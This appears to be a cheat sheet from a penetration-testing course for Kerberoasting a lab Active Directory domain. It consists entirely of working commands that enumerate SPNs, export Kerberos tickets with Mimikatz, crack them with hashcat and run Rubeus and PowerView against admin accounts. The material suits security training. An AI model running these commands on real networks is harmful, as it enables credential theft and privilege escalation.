# Kerberoasting - from Windows

## Enumerate SPNs

```cmd
setspn.exe -Q */*
```

## Request a TGS Ticket for a Specific Service

```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

## Request TGS Tickets for All SPNs

```powershell
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

## Extract Tickets from Memory (Mimikatz)

```cmd
mimikatz # base64 /out:true
mimikatz # kerberos::list /export
```

## Convert Base64 Ticket (Linux)

```bash
echo "<base64 blob>" | tr -d \n
```

## Decode .kirbi File (Linux)

```bash
cat encoded_file | base64 -d > sqldev.kirbi
```

## Extract Hash Using kirbi2john.py (Linux)

```bash
python2.7 kirbi2john.py sqldev.kirbi
```

## Fix Hash Format for Hashcat (Linux)

```bash
sed 's/\$krb5tgs\$(.*):(.*)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

## View Prepared Hash (Linux)

```bash
cat sqldev_tgs_hashcat
```

## Crack TGS Hash with Hashcat (Linux)

```bash
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
```

## PowerView Enumeration

```powershell
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname
```

### Target a Specific User

```powershell
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

### Export All Tickets to CSV

```powershell
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

### View CSV Contents

```powershell
cat .\ilfreight_tgs.csv
```

## Rubeus Usage

```powershell
.\Rubeus.exe
```

### Rubeus Statistics Mode

```powershell
.\Rubeus.exe kerberoast /stats
```

### Filtered Kerberoasting

```powershell
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```
